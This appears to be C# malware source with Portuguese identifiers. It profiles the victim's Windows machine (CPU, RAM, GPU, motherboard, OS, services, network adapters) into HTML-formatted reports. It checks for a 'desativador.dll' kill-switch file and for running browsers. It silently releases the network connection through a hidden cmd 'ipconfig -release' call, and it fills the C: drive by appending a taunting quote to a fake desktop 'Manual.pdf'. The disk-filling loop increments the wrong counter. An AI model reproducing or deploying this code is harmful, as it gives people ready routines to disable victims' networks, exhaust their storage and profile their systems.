public static string getMac()
    {
        NetworkInterface[] i = NetworkInterface.GetAllNetworkInterfaces();
        return Convert.ToString(i[0].GetPhysicalAddress());
    }


public static bool Verificar_se_Tem_Desativador()
    {
        try
        {
            DriveInfo[] all = DriveInfo.GetDrives();
            foreach (DriveInfo d in all)
            {
                if (File.Exists(d.Name + "desativador.dll"))
                {
                    return true;
                }
            }
            return false;
        }
        catch (Exception e) { return false; }
    }





public static bool isNavegando()
    {
        try
        {
            Process[] chrome = Process.GetProcessesByName("chrome");
            Process[] edge = Process.GetProcessesByName("msedge");
            if (chrome.Length > 0 || edge.Length > 0)
                return true;
            else return false;
        }
        catch (Exception e) { return false; }
    }








 public static void bloquearInternet()
    {
        try
        {
            Process a = new Process();
            ProcessStartInfo b = new ProcessStartInfo();
            b.WindowStyle = ProcessWindowStyle.Hidden;
            b.FileName = "cmd.exe";
            b.Arguments = "/C ipconfig -release";
            a.StartInfo = b;
            Process.Start(b);
        }
        catch (Exception e) { }
 
    }





public static bool aindaTemEspacoHD()
    {
        try
        {
            DriveInfo[] all = DriveInfo.GetDrives();
            foreach (DriveInfo d in all)
            {
                if (d.Name == "C:\\")
                {
                    if (d.TotalFreeSpace >= 7372800)
                        return true;
                    else
                        return false;
                }
            }
            return false;
        }
        catch (Exception e) { return false; }
    }
    public static void consumirMemoriaHD()
    {
        try
        {
            if (aindaTemEspacoHD())
            {
                for (int i = 0; i < 1000; i++)
                {
                    using (StreamWriter f = new StreamWriter(Desktop + "Manual.pdf", append: true))
                    {
                        for (int i2 = 0; i2 < 100; i++)
                        {
                            if (!aindaTemEspacoHD())
                            {
                                horaBateu = false;
                            }
                            else
                            {
                                f.WriteLine("\"A aranha constroi a teia e espera pecientemente ate a vitima cair nela, e quando cai, nao tem mais volta\" ");
                            }
                        }
                    }
                }
            }
        }
        catch (Exception e) { }
    }






public static string ObterNomeProcessador()
    {
        string a = "";
        try
        {
            var query = new ObjectQuery("SELECT * FROM Win32_Processor");
            var searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject proc in searcher.Get())
            {
                a = Convert.ToString(proc["Name"]);
            }
            return "<br>Processador: " + a;
        }
        catch (Exception e) { return "<br>Processador: " + a; }
    }
    public static string ObterMemoriaRAM()
    {
        string a = "";
        try
        {
            var query = new ObjectQuery("SELECT * FROM Win32_ComputerSystem");
            var searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject info in searcher.Get())
            {
                a = Convert.ToString(info["TotalPhysicalMemory"]);
            }
            return "<br>Memoria RAM: " + a;
        }
        catch (Exception e) { return "<br>Memoria RAM: " + a; }
    }
    public static string ObterInfoRede()
    {
        string a = "";
        try
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface adapter in interfaces)
            {
                a += "<br>" + adapter.Name + ", Tipo: " + adapter.NetworkInterfaceType + ", Estado: " + adapter.OperationalStatus;
            }
            return a;
        }
        catch (Exception e) { return a; }
    }
    public static string VersaoNETFramework()
    {
        try
        {
            return "<br>NetFramework: " + Environment.Version.ToString();
        }
        catch (Exception e) { return "<br>NetFramework: Invalido"; }
    }
    public static string ObterReoslucaoTela()
    {
        string a = "";
        try
        {
            Screen screen = Screen.PrimaryScreen;
            a = screen.Bounds.Width + " x " + screen.Bounds.Height;
            return "<br>Resolução: " + a;
        }
        catch (Exception e) { return "<br>Resolução: " + a; }
    }
    public static string PlacaMae()
    {
        string a = "";
        try
        {
            var query = new ObjectQuery("SELECT * FROM Win32_BaseBoard");
            var searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject board in searcher.Get())
            {
                a = "<br>Fabricante da Placa-Mãe: " + board["Manufacturer"] + ", Produto: " + board["Product"];
            }
            return a;
        }
        catch (Exception e) { return a; }
    }
    public static string NomeGPU()
    {
        string a = "";
        try
        {
            var query = new ObjectQuery("SELECT * FROM Win32_VideoController");
            var searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject gpu in searcher.Get())
            {
                a = gpu["Caption"].ToString();
            }
            return "<br>GPU: " + a;
        }
        catch (Exception e) { return "<br>GPU: " + a; }
    }
    public static string MemoriaDeVideo()
    {
        string a = "";
        try
        {
            var query = new ObjectQuery("SELECT * FROM Win32_VideoController");
            var searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject gpu in searcher.Get())
            {
                a = gpu["AdapterRAM"].ToString();
            }
            return "<br>Memoria de Video:" + a;
        }
        catch (Exception e) { return "<br>Memoria de Video:" + a; }
    }
    public static string VersaoDoSistema()
    {
        string a = "";
        try
        {
            var query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
            var searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject os in searcher.Get())
            {
                a = os["Caption"].ToString();
            }
            return "<br>Versao do Windows: " + a;
        }
        catch (Exception e) { return "<br>Versao do Windows: " + a; }
    }
    public static string TipoProcessador()
    {
        try
        {
            return Environment.Is64BitOperatingSystem ? "Processador: 64 bits" : "Processador: 32 bits";
        }
        catch (Exception e) { return "Processador: Invalido"; }
    }
    public static string DNSHostName()
    {
        try
        {
            return "<br>DNS Host Name: " + Dns.GetHostName();
        }
        catch (Exception e) { return "<br>DNS Host Name: Invalido"; }
    }
    public static string ObterTodosProcessosRodando()
    {
        string a = "<br>Processos Rodando no momento:";
        try
        {
            ServiceController[] services = ServiceController.GetServices();
            foreach (ServiceController service in services)
            {
                a += "<br>Serviço: " + service.ServiceName + ", Status: " + service.Status;
            }
            return a;
        }
        catch (Exception e) { return a; }
    }




